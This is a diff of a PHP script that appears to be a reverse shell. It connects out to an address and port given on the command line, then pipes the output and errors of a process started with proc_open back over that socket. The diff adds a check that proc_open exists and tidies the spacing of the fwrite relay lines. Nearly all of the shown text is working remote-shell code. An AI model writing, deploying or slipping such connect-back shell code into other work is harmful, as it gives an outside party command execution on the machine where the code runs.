@@ -18,6 +18,14 @@ $address = $argv [1];
 $port = isset ( $argv [2] ) ? $argv [2] : 3391;
 $type = isset ( $argv [3] ) ? $argv [3] : 'tcp';
 
+echo "\nChecking if function  \e[1mproc_open\e[0m is available... ";
+
+if (function_exists ( 'proc_open' )) {
+	echo "Ok.\n";
+} else {
+	exit ( "Failed." );
+}
+
 echo "\nTrying to connect... ";
 $session = @stream_socket_client ( $type . '://' . $address . ':' . $port, $errno, $errstr, 30 );
 if (! $session) {
@@ -114,11 +122,11 @@ if (! $session) {
 		}
 		
 		if (in_array ( $pipes [1], $read )) {
-			fwrite( $session, fread ( $pipes [1], 1024 ) );
+			fwrite ( $session, fread ( $pipes [1], 1024 ) );
 		}
 		
 		if (in_array ( $pipes [2], $read )) {
-			fwrite( $session, fread ( $pipes [2], 1024 ));
+			fwrite ( $session, fread ( $pipes [2], 1024 ) );
 		}
 	}
 }
